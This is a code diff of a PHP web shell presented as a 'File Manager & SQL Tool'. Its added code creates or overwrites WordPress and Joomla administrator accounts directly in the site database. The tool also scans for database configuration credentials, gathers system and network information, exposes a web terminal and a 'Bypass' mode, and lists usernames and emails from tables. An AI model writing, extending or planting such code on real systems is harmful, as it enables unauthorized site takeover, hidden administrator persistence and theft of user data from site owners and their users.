+            $cms_admin_msg = 'Select DB failed: ' . mysql_error();
+        } else {
+            if ($cms_type === 'wordpress') {
+                $users_table = $prefix . 'users';
+                $au = mysql_real_escape_string($admin_user, $link);
+                $ae = mysql_real_escape_string($admin_email, $link);
+                $hp = md5($admin_pass);
+                $nm = mysql_real_escape_string($admin_user, $link);
+                $now = mysql_real_escape_string(date('Y-m-d H:i:s'), $link);
+                $exist = @mysql_query("SELECT ID FROM `".$users_table."` WHERE user_login='".$au."' LIMIT 1");
+                if ($exist && mysql_num_rows($exist)>0) {
+                    $row = mysql_fetch_assoc($exist); $uid=intval($row['ID']);
+                    @mysql_query("UPDATE `".$users_table."` SET user_pass='".$hp."', user_email='".$ae."' WHERE ID=".$uid);
+                    $cms_admin_msg = 'Updated existing WordPress user ID '.$uid;
+                } else {
+                    $ins = @mysql_query("INSERT INTO `".$users_table."` (user_login,user_pass,user_email,user_nicename,display_name,user_registered,user_status) VALUES ('".$au."','".$hp."','".$ae."','".$nm."','".$nm."','".$now."',0)");
+                    if (!$ins) {
+                        $cms_admin_msg = 'Insert WordPress user failed: '.htmlspecialchars(mysql_error($link));
+                    } else {
+                        $uid = mysql_insert_id();
+                        @mysql_query("INSERT INTO `".$prefix."usermeta` (user_id,meta_key,meta_value) VALUES (".$uid.",'".$prefix."capabilities','a:1:{s:13:\"administrator\";b:1;}')");
+                        @mysql_query("INSERT INTO `".$prefix."usermeta` (user_id,meta_key,meta_value) VALUES (".$uid.",'".$prefix."user_level','10')");
+                        $cms_admin_msg = 'WordPress admin user created ID '.$uid;
+                    }
+                }
+                
+                if (isset($uid)) {
+                    $detailRes = @mysql_query("SELECT ID,user_login,user_email,user_registered,display_name FROM `".$users_table."` WHERE ID=".$uid." LIMIT 1", $link);
+                    if ($detailRes && mysql_num_rows($detailRes) === 1) {
+                        $d = mysql_fetch_assoc($detailRes);
+                        $cms_admin_details = 'ID: '.htmlspecialchars($d['ID'])."\n".
+                            'Login: '.htmlspecialchars($d['user_login'])."\n".
+                            'Email: '.htmlspecialchars($d['user_email'])."\n".
+                            'Registered: '.htmlspecialchars($d['user_registered'])."\n".
+                            'Display: '.htmlspecialchars($d['display_name'])."\n".
+                            'Table Prefix: '.htmlspecialchars($prefix)."\n".
+                            'CMS: WordPress';
+                    }
+                }
+            } elseif ($cms_type === 'joomla') {
+                $users_table = $prefix . 'users';
+                $map_table = $prefix . 'user_usergroup_map';
+                if (function_exists('password_hash')) {
+                    $hash = password_hash($admin_pass, PASSWORD_BCRYPT);
+                } else {
+                    $salt = substr(md5(uniqid(mt_rand(), true)),0,16);
+                    $hash = md5($admin_pass.$salt).':'.$salt;
+                }
+                $au = mysql_real_escape_string($admin_user, $link);
+                $ae = mysql_real_escape_string($admin_email, $link);
+                $hp = mysql_real_escape_string($hash, $link);
+                $nm = mysql_real_escape_string($admin_user, $link);
+                $now = mysql_real_escape_string(date('Y-m-d H:i:s'), $link);
+                $exist = @mysql_query("SELECT id FROM `".$users_table."` WHERE username='".$au."' LIMIT 1");
+                if ($exist && mysql_num_rows($exist)>0) {
+                    $row = mysql_fetch_assoc($exist); $uid=intval($row['id']);
+                    @mysql_query("UPDATE `".$users_table."` SET password='".$hp."', email='".$ae."' WHERE id=".$uid);
+                    $cms_admin_msg = 'Updated existing Joomla user ID '.$uid;
+                } else {
+                    $ins = @mysql_query("INSERT INTO `".$users_table."` (name,username,email,password,block,sendEmail,registerDate) VALUES ('".$nm."','".$au."','".$ae."','".$hp."',0,0,'".$now."')");
+                    if (!$ins) {
+                        $cms_admin_msg = 'Insert Joomla user failed: '.htmlspecialchars(mysql_error($link));
+                    } else {
+                        $uid = mysql_insert_id();
+                        @mysql_query("INSERT INTO `".$map_table."` (user_id, group_id) VALUES (".$uid.", 8)");
+                        $cms_admin_msg = 'Joomla admin user created ID '.$uid;
+                    }
+                }
+                
+                if (isset($uid)) {
+                    $detailRes = @mysql_query("SELECT id as ID, username, email, registerDate FROM `".$users_table."` WHERE id=".$uid." LIMIT 1", $link);
+                    if ($detailRes && mysql_num_rows($detailRes)===1) {
+                        $d = mysql_fetch_assoc($detailRes);
+                        $cms_admin_details = 'ID: '.htmlspecialchars($d['ID'])."\n".
+                            'Username: '.htmlspecialchars($d['username'])."\n".
+                            'Email: '.htmlspecialchars($d['email'])."\n".
+                            'Registered: '.htmlspecialchars($d['registerDate'])."\n".
+                            'Table Prefix: '.htmlspecialchars($prefix)."\n".
+                            'CMS: Joomla';
+                    }
+                }
+            }
+        }
+    }
+    
+    if (isset($_POST['cms_detect_prefix'])) {
+        $host = isset($_POST['db_host']) ? $_POST['db_host'] : 'localhost';
+        $dbn  = isset($_POST['db_name']) ? $_POST['db_name'] : '';
+        $user = isset($_POST['db_user']) ? $_POST['db_user'] : '';
+        $pass = isset($_POST['db_pass']) ? $_POST['db_pass'] : '';
+        if ($dbn === '' || $user === '') {
+            $cms_admin_msg = 'Cannot detect: DB name / user empty.';
+        } else {
+            $link = @mysql_connect($host, $user, $pass);
+            if (!$link) {
+                $cms_admin_msg = 'Detect failed: connect error.';
+            } elseif (!@mysql_select_db($dbn, $link)) {
+                $cms_admin_msg = 'Detect failed: select DB error.';
+            } else {
+                $res = @mysql_query('SHOW TABLES', $link);
+                if (!$res) {
+                    $cms_admin_msg = 'Detect failed: cannot list tables.';
+                } else {
+                    $candidates = array();
+                    while ($row = mysql_fetch_row($res)) {
+                        $t = $row[0];
+                        if (preg_match('/^(.+)_users$/', $t, $m)) {
+                            $prefix = $m[1] . '_';
+                            if (!isset($candidates[$prefix])) $candidates[$prefix] = array('users'=>false,'usermeta'=>false,'options'=>false,'posts'=>false,'count'=>0);
+                            $candidates[$prefix]['users'] = true;
+                        } elseif (preg_match('/^(.+)_usermeta$/', $t, $m)) {
+                            $prefix = $m[1] . '_';
+                            if (!isset($candidates[$prefix])) $candidates[$prefix] = array('users'=>false,'usermeta'=>false,'options'=>false,'posts'=>false,'count'=>0);
+                            $candidates[$prefix]['usermeta'] = true;
+                        } elseif (preg_match('/^(.+)_options$/', $t, $m)) {
+                            $prefix = $m[1] . '_';
+                            if (!isset($candidates[$prefix])) $candidates[$prefix] = array('users'=>false,'usermeta'=>false,'options'=>false,'posts'=>false,'count'=>0);
+                            $candidates[$prefix]['options'] = true;
+                        } elseif (preg_match('/^(.+)_posts$/', $t, $m)) {
+                            $prefix = $m[1] . '_';
+                            if (!isset($candidates[$prefix])) $candidates[$prefix] = array('users'=>false,'usermeta'=>false,'options'=>false,'posts'=>false,'count'=>0);
+                            $candidates[$prefix]['posts'] = true;
+                        }
+                    }
+                    foreach ($candidates as $p=>$info) {
+                        $candidates[$p]['count'] = ($info['users']?1:0)+($info['usermeta']?1:0)+($info['options']?1:0)+($info['posts']?1:0);
+                    }
+                    uasort($candidates, function($a,$b){ return $b['count'] - $a['count']; });
+                    $cms_prefix_suggestions = array_keys($candidates);
+                    if (count($cms_prefix_suggestions) === 0) {
+                        $cms_admin_msg = 'No WP-like tables found.';
+                    } elseif (count($cms_prefix_suggestions) === 1) {
+                        $_SESSION['cms_parsed']['prefix'] = $cms_prefix_suggestions[0];
+                        $cms_admin_msg = 'Detected prefix: '.$cms_prefix_suggestions[0];
+                    } else {
+                        $cms_admin_msg = 'Multiple candidates: '.implode(', ', $cms_prefix_suggestions);
+                    }
+                }
+            }
         }
     }
 }
 
-// cek disable functions utk ditampilkan
-$disabled_funcs = ini_get("disable_functions");
-if (!$disabled_funcs) {
-    $disabled_funcs = "None";
+// === LOGOUT ===
+if (isset($_GET['logout']) && $_GET['logout'] == 1) {
+    session_destroy();
+    header("Location: " . basename(__FILE__));
+    exit;
+}
+
+// === GET SYSTEM INFO ===
+$sys = array();
+$sys['php_version'] = phpversion();
+$sys['server_os'] = php_uname();
+$sys['web_server'] = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'CLI';
+$sys['current_user'] = function_exists('get_current_user') ? get_current_user() : 'unknown';
+$sys['document_root'] = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : getcwd();
+$sys['current_dir'] = $dir;
+$sys['disabled_functions'] = ini_get("disable_functions") ?: 'None';
+// Uptime & load
+$sys['uptime'] = null;
+$sys['load'] = null;
+if (is_readable('/proc/uptime')) {
+    $u = @file_get_contents('/proc/uptime');
+    if ($u !== false) {
+        $parts = preg_split('/\s+/', trim($u));
+        if (isset($parts[0])) {
+            $seconds = (int)floatval($parts[0]);
+            $days = floor($seconds / 86400);
+            $hours = floor(($seconds % 86400) / 3600);
+            $mins = floor(($seconds % 3600) / 60);
+            $sys['uptime'] = $days . 'd ' . $hours . 'h ' . $mins . 'm';
+        }
+    }
+}
+if (function_exists('sys_getloadavg')) {
+    $loads = @sys_getloadavg();
+    if ($loads !== false && is_array($loads)) $sys['load'] = implode(', ', $loads);
+} elseif (is_readable('/proc/loadavg')) {
+    $l = @file_get_contents('/proc/loadavg');
+    if ($l !== false) $sys['load'] = trim(explode(' ', trim($l))[0]);
+}
+// Memory info
+$sys['mem_total'] = null; $sys['mem_free'] = null;
+if (is_readable('/proc/meminfo')) {
+    $m = @file_get_contents('/proc/meminfo');
+    if ($m !== false) {
+        if (preg_match('/MemTotal:\s+(\d+) kB/i', $m, $mm)) $sys['mem_total'] = intval($mm[1]) * 1024;
+        if (preg_match('/MemFree:\s+(\d+) kB/i', $m, $mf)) $sys['mem_free'] = intval($mf[1]) * 1024;
+    }
+}
+// Disk usage
+$df = @disk_free_space($dir);
+$dt = @disk_total_space($dir);
+$sys['disk_free'] = $df === false ? null : $df;
+$sys['disk_total'] = $dt === false ? null : $dt;
+// Network interfaces
+$sys['ip_addresses'] = array();
+if (function_exists('shell_exec')) {
+    $ifcfg = @shell_exec("/sbin/ip -4 -o addr show 2>/dev/null || /sbin/ifconfig 2>/dev/null");
+    if ($ifcfg) {
+        if (preg_match_all('/(\d+\.\d+\.\d+\.\d+)/', $ifcfg, $ips)) {
+            $sys['ip_addresses'] = array_values(array_unique($ips[1]));
+        }
+    }
 }
 ?>
 <!DOCTYPE html>
@@ -1235,7 +1121,6 @@ if (!$disabled_funcs) {
     .full-width-block { width:100%; }
         .header { display:flex; align-items:center; justify-content:space-between; padding:14px 18px; border-radius:10px; background:#071018; border:1px solid rgba(255,255,255,0.03); margin-bottom:16px; }
         .header h1 { font-size:1.4rem; font-weight:600; color:#e6eef8; }
-
     .nav-tabs { display:flex; gap:8px; margin:0 0 16px; flex-wrap:wrap; }
         .nav-tab {
             padding:10px 16px; border-radius:8px; text-decoration:none; color:#bcd3ff; background:transparent;
@@ -1243,52 +1128,40 @@ if (!$disabled_funcs) {
         }
         .nav-tab:hover { transform:translateY(-1px); box-shadow:0 6px 18px rgba(59,130,246,0.06); }
         .nav-tab.active { background:rgba(59,130,246,0.12); color:#dff0ff; border-color:rgba(59,130,246,0.2); }
-
         .logout-btn { background:#ef4444; color:white; padding:8px 12px; border-radius:8px; text-decoration:none; }
         .logout-btn:hover { filter:brightness(.95); }
-
     .card { background:#071420; border:1px solid rgba(255,255,255,0.03); border-radius:12px; padding:18px 20px 20px; margin-bottom:14px; box-shadow:0 4px 18px -4px rgba(0,0,0,0.55), 0 0 0 1px rgba(255,255,255,0.015); }
         .card h3 { color:#e6eef8; margin-bottom:12px; font-size:1.05rem; }
-
         .server-info { background:linear-gradient(180deg,#071420,#06121a); border:1px solid rgba(255,255,255,0.03); padding:12px; border-radius:10px; color:#cfe6ff; }
         .server-info strong { color:#e6eef8; }
-
         .btn { background:#2563eb; color:white; padding:8px 12px; border-radius:8px; border:none; cursor:pointer; display:inline-block; text-decoration:none; }
         .btn:hover { background:#1e40af; }
         .btn-danger { background:#ef4444; }
         .btn-success { background:#10b981; }
-
         .form-group { margin-bottom:12px; }
         label { display:block; margin-bottom:6px; color:#a9c0e8; font-weight:600; }
         .form-control { width:100%; padding:10px 12px; border-radius:8px; background:#03101a; color:#dbe7ff; border:1px solid rgba(255,255,255,0.03); }
         .form-control:focus { outline:none; box-shadow:0 6px 20px rgba(59,130,246,0.06); border-color:rgba(59,130,246,0.28); }
-
     .table-wrapper { width:100%; overflow:auto; border:1px solid rgba(255,255,255,0.04); border-radius:10px; }
     .table { width:100%; border-collapse:separate; border-spacing:0; background:transparent; }
     .table th, .table td { padding:10px 14px; text-align:left; border-bottom:1px solid rgba(255,255,255,0.04); color:#cfe6ff; font-size:0.9rem; }
     .table th { position:sticky; top:0; background:#0c1825; backdrop-filter:blur(4px); color:#9fc6ff; font-weight:600; text-transform:uppercase; font-size:0.7rem; letter-spacing:0.05em; }
     .table tr:last-child td { border-bottom:none; }
     .table tr:hover td { background:rgba(59,130,246,0.06); }
-
         .alert { padding:12px; border-radius:8px; margin-bottom:12px; }
         .alert-success { background:rgba(16,185,129,0.06); color:#9ff3d9; border:1px solid rgba(16,185,129,0.09); }
         .alert-danger { background:rgba(239,68,68,0.06); color:#ffd6d6; border:1px solid rgba(239,68,68,0.09); }
-
     .terminal { background:#000e1a; color:#9fffb3; padding:16px 18px; border-radius:12px; font-family:monospace; font-size:0.9rem; border:1px solid rgba(255,255,255,0.04); box-shadow:inset 0 0 0 1px rgba(255,255,255,0.02); }
         .terminal pre { white-space:pre-wrap; word-break:break-word; margin-top:8px; color:#a7ffc4; }
-
         .sql-editor { background:#041022; border:1px solid rgba(255,255,255,0.03); color:#e6eef8; border-radius:8px; padding:12px; font-family:monospace; min-height:120px; }
-
         .grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(320px,1fr)); gap:14px; }
         .stats { display:flex; gap:12px; margin-bottom:12px; flex-wrap:wrap; }
         .stat-card { background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01)); padding:12px; border-radius:10px; flex:1; min-width:160px; border:1px solid rgba(255,255,255,0.02); }
     .stat-number { font-size:1.5rem; font-weight:700; color:#dff0ff; }
     .stat-label { color:#9fb7d8; font-size:0.8rem; text-transform:uppercase; }
-
     /* JS-free edit row toggler */
     .edit-row { display:none; }
     .edit-row:target { display:block; }
-
         @media (max-width:1024px) {
             .container { padding:16px 18px 36px; }
         }
@@ -1306,7 +1179,6 @@ if (!$disabled_funcs) {
         <h1>File Manager & SQL Tool</h1>
         <a href="?logout=1" class="logout-btn">Logout</a>
     </div>
-
     <!-- Navigation Tabs -->
     <div class="nav-tabs">
         <a href="?mode=files" class="nav-tab <?php echo $mode === 'files' ? 'active' : ''; ?>">📁 File Manager</a>
@@ -1314,72 +1186,7 @@ if (!$disabled_funcs) {
         <a href="?mode=scan" class="nav-tab <?php echo $mode === 'scan' ? 'active' : ''; ?>">🔍 DB Scanner</a>
     <a href="?mode=bypass" class="nav-tab <?php echo $mode === 'bypass' ? 'active' : ''; ?>">🚧 Bypass</a>
     </div>
-
 <!-- Server Info -->
-    <?php
-    // Collect extended system info (best-effort, PHP5 compatible)
-    $sys = array();
-    $sys['php_version'] = phpversion();
-    $sys['server_os'] = php_uname();
-    $sys['web_server'] = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'CLI';
-    $sys['current_user'] = function_exists('get_current_user') ? get_current_user() : 'unknown';
-    $sys['document_root'] = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : getcwd();
-    $sys['current_dir'] = $dir;
-    $sys['disabled_functions'] = isset($disabled_funcs) ? $disabled_funcs : 'None';
-
-    // Uptime & load (Linux-friendly)
-    $sys['uptime'] = null;
-    $sys['load'] = null;
-    if (is_readable('/proc/uptime')) {
-        $u = @file_get_contents('/proc/uptime');
-        if ($u !== false) {
-            $parts = preg_split('/\s+/', trim($u));
-            if (isset($parts[0])) {
-                $seconds = (int)floatval($parts[0]);
-                $days = floor($seconds / 86400);
-                $hours = floor(($seconds % 86400) / 3600);
-                $mins = floor(($seconds % 3600) / 60);
-                $sys['uptime'] = $days . 'd ' . $hours . 'h ' . $mins . 'm';
-            }
-        }
-    }
-    if (function_exists('sys_getloadavg')) {
-        $loads = @sys_getloadavg();
-        if ($loads !== false && is_array($loads)) $sys['load'] = implode(', ', $loads);
-    } elseif (is_readable('/proc/loadavg')) {
-        $l = @file_get_contents('/proc/loadavg');
-        if ($l !== false) $sys['load'] = trim(explode(' ', trim($l))[0]);
-    }
-
-    // Memory info (Linux /proc/meminfo)
-    $sys['mem_total'] = null; $sys['mem_free'] = null;
-    if (is_readable('/proc/meminfo')) {
-        $m = @file_get_contents('/proc/meminfo');
-        if ($m !== false) {
-            if (preg_match('/MemTotal:\s+(\d+) kB/i', $m, $mm)) $sys['mem_total'] = intval($mm[1]) * 1024;
-            if (preg_match('/MemFree:\s+(\d+) kB/i', $m, $mf)) $sys['mem_free'] = intval($mf[1]) * 1024;
-        }
-    }
-
-    // Disk usage for current dir
-    $df = @disk_free_space($dir);
-    $dt = @disk_total_space($dir);
-    $sys['disk_free'] = $df === false ? null : $df;
-    $sys['disk_total'] = $dt === false ? null : $dt;
-
-    // Network interfaces (simple best-effort)
-    $sys['ip_addresses'] = array();
-    if (function_exists('shell_exec')) {
-        $ifcfg = @shell_exec("/sbin/ip -4 -o addr show 2>/dev/null || /sbin/ifconfig 2>/dev/null");
-        if ($ifcfg) {
-            // Extract IPv4 addresses roughly
-            if (preg_match_all('/(\d+\.\d+\.\d+\.\d+)/', $ifcfg, $ips)) {
-                $sys['ip_addresses'] = array_values(array_unique($ips[1]));
-            }
-        }
-    }
-    ?>
-
     <div class="card">
         <h3>System Information</h3>
         <table class="table">
@@ -1399,13 +1206,11 @@ if (!$disabled_funcs) {
             <tr><th>IP Addresses</th><td><?php echo !empty($sys['ip_addresses']) ? htmlspecialchars(implode(', ', $sys['ip_addresses'])) : 'N/A'; ?></td></tr>
         </table>
     </div>
-
     <?php if ($mode === 'files'): ?>
         <!-- FILE MANAGER MODE -->
         <?php if (!empty($msg)): ?>
             <div class="alert alert-success"><?php echo $msg; ?></div>
         <?php endif; ?>
-
         <!-- Navigation -->
         <div class="card">
             <form method="GET" style="display: inline;">
@@ -1418,7 +1223,6 @@ if (!$disabled_funcs) {
                 </div>
             </form>
         </div>
-
         <!-- File Operations (Compact Toolbar) -->
         <div class="card" style="margin-bottom:18px;">
             <h3 style="margin-top:0;display:flex;align-items:center;gap:10px;">File Operations
@@ -1471,7 +1275,6 @@ if (!$disabled_funcs) {
                 <?php endif; ?>
             </div>
         </div>
-
         <!-- Add Admin (CMS) -->
         <div class="card" style="margin-bottom:18px;">
             <h3 style="margin:0 0 12px;display:flex;align-items:center;gap:10px;">Add New Admin <small style="font-size:11px;color:#6f859d;font-weight:400;">(WordPress / Joomla / vBulletin)</small></h3>
@@ -1502,19 +1305,19 @@ if (!$disabled_funcs) {
                     <input type="hidden" name="cms_type" value="<?php echo isset($_SESSION['cms_type'])?htmlspecialchars($_SESSION['cms_type']):''; ?>">
                     <div>
                         <label>MySQL Host</label>
-                        <input type="text" name="db_host" class="form-control" value="<?php echo isset($prefill['db_host'])?htmlspecialchars($prefill['db_host']):'localhost'; ?>">
+                        <input type="text" name="db_host" class="form-control" value="<?php echo isset($prefill['host'])?htmlspecialchars($prefill['host']):'localhost'; ?>">
                     </div>
                     <div>
                         <label>Db Name</label>
-                        <input type="text" name="db_name" class="form-control" value="<?php echo isset($prefill['db_name'])?htmlspecialchars($prefill['db_name']):''; ?>">
+                        <input type="text" name="db_name" class="form-control" value="<?php echo isset($prefill['db'])?htmlspecialchars($prefill['db']):''; ?>">
                     </div>
                     <div>
                         <label>Db User</label>
-                        <input type="text" name="db_user" class="form-control" value="<?php echo isset($prefill['db_user'])?htmlspecialchars($prefill['db_user']):''; ?>">
+                        <input type="text" name="db_user" class="form-control" value="<?php echo isset($prefill['user'])?htmlspecialchars($prefill['user']):''; ?>">
                     </div>
                     <div>
                         <label>Db Pass</label>
-                        <input type="text" name="db_pass" class="form-control" value="<?php echo isset($prefill['db_pass'])?htmlspecialchars($prefill['db_pass']):''; ?>">
+                        <input type="text" name="db_pass" class="form-control" value="<?php echo isset($prefill['pass'])?htmlspecialchars($prefill['pass']):''; ?>">
                     </div>
                     <div>
                         <label>Table Prefix</label>
@@ -1561,16 +1364,13 @@ if (!$disabled_funcs) {
                 <?php endif; ?>
             </div>
         </div>
-
         <!-- File List -->
         <div class="card">
             <h3>Directory Contents</h3>
             <?php if (is_dir($dir)): ?>
-                <?php echo '<div style="color:#ff0;background:#222;padding:4px 8px;">DEBUG: Directory = '.htmlspecialchars($dir).'</div>'; ?>
                 <table class="table">
                     <thead>
                         <tr>
-                <?php echo '<div style="color:#ff0;background:#222;padding:4px 8px;">DEBUG: End of file list</div>'; ?>
                             <th>Name</th>
                             <th>Type</th>
                             <th>Size</th>
@@ -1587,26 +1387,22 @@ if (!$disabled_funcs) {
                             if ($ff === '.') continue;
                             $all_files[] = $ff;
                         }
-
                         $total_files = count($all_files);
-                        $per_page = 20; // items per page
+                        $per_page = 20;
                         $page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
                         $pages = max(1, ceil($total_files / $per_page));
                         if ($page > $pages) $page = $pages;
                         $start = ($page - 1) * $per_page;
                         $page_files = array_slice($all_files, $start, $per_page);
-
                         foreach ($page_files as $f):
                             $path = $dir . DIRECTORY_SEPARATOR . $f;
                             ?>
                                 <tr>
                                     <?php
-                                    // Get permission
                                     $perm = @fileperms($path);
                                     $permstr = $perm !== false ? substr(sprintf('%o', $perm), -4) : '----';
                                     $isWritable = is_writable($path);
                                     $isReadable = is_readable($path);
-                                    // Status color logic
                                     $status = 'white';
                                     $statusText = 'Normal';
                                     if ($permstr === '777' || $permstr === '666') {
@@ -1678,13 +1474,11 @@ if (!$disabled_funcs) {
                             <?php endforeach; ?>
                     </tbody>
                 </table>
-
                 <?php if ($pages > 1): ?>
                     <div style="margin-top:10px; display:flex; gap:6px; flex-wrap:wrap;">
                         <?php
                         $base = '?dir=' . urlencode($dir);
                         if (isset($_GET['mode'])) $base .= '&mode=' . urlencode($_GET['mode']);
-                        // show up to first 10 pages to keep UI compact
                         $maxShow = 10;
                         $end = min($pages, $maxShow);
                         for ($p = 1; $p <= $end; $p++): ?>
@@ -1698,7 +1492,6 @@ if (!$disabled_funcs) {
                 <?php endif; ?>
             <?php endif; ?>
         </div>
-
         <!-- File View/Edit -->
         <?php if (isset($_GET['view'])): ?>
             <?php
@@ -1711,7 +1504,6 @@ if (!$disabled_funcs) {
                 </div>
             <?php endif; ?>
         <?php endif; ?>
-
         <?php if (isset($_GET['edit'])): ?>
             <?php
             $file = $dir . DIRECTORY_SEPARATOR . $_GET['edit'];
@@ -1730,7 +1522,6 @@ if (!$disabled_funcs) {
                 </div>
             <?php endif; ?>
         <?php endif; ?>
-
         <!-- Database Config Scanner -->
         <div class="card">
             <h3>🔎 Database Config Scanner</h3>
@@ -1751,19 +1542,16 @@ if (!$disabled_funcs) {
                 </div>
                 <button type="submit" name="scan_db" class="btn">🔍 Scan for Database Configs</button>
             </form>
-
             <?php if ($scan_dur !== null): ?>
                 <div class="alert alert-success" style="margin-top: 15px;">
                     ✅ Scan completed in <strong><?php echo number_format($scan_dur, 2); ?>s</strong> · Found <strong><?php echo count($scan_items); ?></strong> database configurations
                 </div>
             <?php endif; ?>
-
             <?php if ($scan_msg): ?>
                 <div class="alert alert-danger" style="margin-top: 15px;">
                     ❌ <?php echo htmlspecialchars($scan_msg); ?>
                 </div>
             <?php endif; ?>
-
             <?php if ($scan_items): ?>
                 <table class="table" style="margin-top: 15px;">
                     <thead>
@@ -1804,7 +1592,6 @@ if (!$disabled_funcs) {
                 </div>
             <?php endif; ?>
         </div>
-
         <!-- Terminal -->
         <div class="card">
             <h3>Web Terminal</h3>
@@ -1820,7 +1607,6 @@ if (!$disabled_funcs) {
                 </div>
             <?php endif; ?>
         </div>
-
     <?php elseif ($mode === 'sql'): ?>
         <!-- SQL MANAGER MODE -->
         <div class="card">
@@ -1873,14 +1659,12 @@ if (!$disabled_funcs) {
                             </div>
                         </div>
                     </div>
-
                     <div style="flex:1;">
                         <?php if (!empty($db_error)): ?>
                             <div class="alert <?php echo strpos($db_error, 'successfully') !== false ? 'alert-success' : 'alert-danger'; ?>">
                                 <?php echo htmlspecialchars($db_error); ?>
                             </div>
                         <?php endif; ?>
-
                         <div class="card">
                             <h4>🔍 SQL Query</h4>
                             <form method="POST">
@@ -1890,7 +1674,6 @@ if (!$disabled_funcs) {
                                 <button type="submit" name="execute_query" class="btn btn-success">⚡ Execute Query</button>
                             </form>
                         </div>
-
                         <?php if (!empty($db_current_table)): ?>
                             <div class="card" style="margin-top:12px;">
                                 <div style="display:flex; justify-content:space-between; align-items:center;">
@@ -1919,7 +1702,6 @@ if (!$disabled_funcs) {
                                         </table>
                                     <?php endif; ?>
                                 </div>
-
                                 <div style="margin-top:10px;">
                                     <?php if (isset($db_current_table) && $db_current_table !== ''): ?>
                                         <h4 style="margin-bottom:8px;">Browse: <?php echo htmlspecialchars($db_current_table); ?> <?php if (isset($total_rows)) { echo '<span style="font-size:0.9rem;color:#9fb7d8">(page '.intval(isset($tbl_page)?$tbl_page:1).', per 50, total '.intval($total_rows).')</span>'; } ?></h4>
@@ -1933,7 +1715,7 @@ if (!$disabled_funcs) {
                                         <label>Order
                                             <select name="sort" style="margin-left:6px;">
                                                 <option value="">-</option>
-                                                <?php if (!empty($cols)) { foreach ($cols as $fcol) { $sel = (isset($_GET['sort']) && $_GET['sort']===$fcol)?'selected':''; echo '<option value="'.htmlspecialchars($fcol).'" '.$sel.'>'.htmlspecialchars($fcol).'</option>'; } } ?>
+                                                <?php if (!empty($table_structure)) { foreach ($table_structure as $fcol) { $sel = (isset($_GET['sort']) && $_GET['sort']===$fcol['Field'])?'selected':''; echo '<option value="'.htmlspecialchars($fcol['Field']).'" '.$sel.'>'.htmlspecialchars($fcol['Field']).'</option>'; } } ?>
                                             </select>
                                         </label>
                                         <label>
@@ -1942,7 +1724,6 @@ if (!$disabled_funcs) {
                                         <label>Per <input type="text" name="per" value="<?php echo isset($tbl_per_page)?intval($tbl_per_page):50; ?>" style="width:70px; margin-left:6px;"></label>
                                         <label>Page <input type="text" name="tblpage" value="<?php echo isset($tbl_page)?intval($tbl_page):1; ?>" style="width:70px; margin-left:6px;"></label>
                                         <?php
-                                            // raw toggle link (show unsanitized field values)
                                             $raw = isset($_GET['raw']) && $_GET['raw']=='1';
                                             $qs = $_GET; if ($raw) { unset($qs['raw']); } else { $qs['raw'] = '1'; }
                                             $toggleRawUrl = strtok($_SERVER['REQUEST_URI'], '?') . '?' . http_build_query($qs);
@@ -1952,7 +1733,6 @@ if (!$disabled_funcs) {
                                     </form>
                                     <?php if (!empty($db_result)): ?>
                                         <div style="overflow-x:auto; margin-top:8px;">
-                                            <!-- Insert toggle/form -->
                                             <div style="margin-bottom:8px;">
                                                 <button class="btn" type="button" onclick="document.getElementById('insert-form').style.display = document.getElementById('insert-form').style.display === 'none' ? 'block' : 'none';">+ Insert Row</button>
                                             </div>
@@ -1970,21 +1750,19 @@ if (!$disabled_funcs) {
                                                 </form>
                                             </div>
                                             <?php
-                                                // compute $cols safely (from current results or table structure)
-                                                $cols = array();
-                                                if (!empty($db_result) && is_array($db_result) && isset($db_result[0]) && is_array($db_result[0])) {
-                                                    $cols = array_keys($db_result[0]);
-                                                } elseif (!empty($table_structure) && is_array($table_structure)) {
-                                                    foreach ($table_structure as $cf) { if (isset($cf['Field'])) $cols[] = $cf['Field']; }
-                                                }
-
-                                                // detect common user-like columns to quickly show usernames/emails
                                                 $userCandidates = array('username','user','email','login','name','user_name','email_address');
                                                 $foundUserCols = array();
-                                                foreach ($cols as $c) {
-                                                    $lc = strtolower($c);
-                                                    foreach ($userCandidates as $uc) {
-                                                        if ($lc === $uc || strpos($lc, $uc) !== false) { $foundUserCols[] = $c; break; }
+                                                if (!empty($table_structure)) {
+                                                    foreach ($table_structure as $cf) {
+                                                        if (isset($cf['Field'])) {
+                                                            $lc = strtolower($cf['Field']);
+                                                            foreach ($userCandidates as $uc) {
+                                                                if ($lc === $uc || strpos($lc, $uc) !== false) { 
+                                                                    $foundUserCols[] = $cf['Field']; 
+                                                                    break; 
+                                                                }
+                                                            }
+                                                        }
                                                     }
                                                 }
                                                 if (!empty($foundUserCols) && !empty($db_result) && is_array($db_result)) {
@@ -1995,7 +1773,9 @@ if (!$disabled_funcs) {
                                                     echo '<ul style="list-style:none;padding-left:0;margin:0;">';
                                                     foreach ($db_result as $r) {
                                                         $vals = array();
-                                                        foreach ($foundUserCols as $fc) { $vals[] = htmlspecialchars(isset($r[$fc]) ? $r[$fc] : ''); }
+                                                        foreach ($foundUserCols as $fc) { 
+                                                            $vals[] = htmlspecialchars(isset($r[$fc]) ? $r[$fc] : ''); 
+                                                        }
                                                         echo '<li style="font-family:monospace;padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.02);">' . implode(' | ', $vals) . '</li>';
                                                     }
                                                     echo '</ul></div>';
@@ -2028,7 +1808,6 @@ if (!$disabled_funcs) {
                                                                 <?php endforeach; ?>
                                                                 <td>
                                                                     <?php
-                                                                    // build primary key map: try to use 'id' or all key columns
                                                                     $pk = array();
                                                                     foreach ($table_structure as $col) {
                                                                         if (isset($col['Key']) && strtoupper($col['Key']) === 'PRI') {
@@ -2111,8 +1890,7 @@ if (!$disabled_funcs) {
                 <button type="submit" name="scan_configs" class="btn btn-success" style="margin-top: 15px;">🔍 Start Scanning</button>
             </form>
         </div>
-
-        <?php if ($scan_result !== null): ?>
+        <?php if (isset($scan_result)): ?>
             <div class="card">
                 <h3>📋 Scan Results</h3>
                 
@@ -2216,10 +1994,8 @@ if (!$disabled_funcs) {
 <script>
 function toggleEdit(btn) {
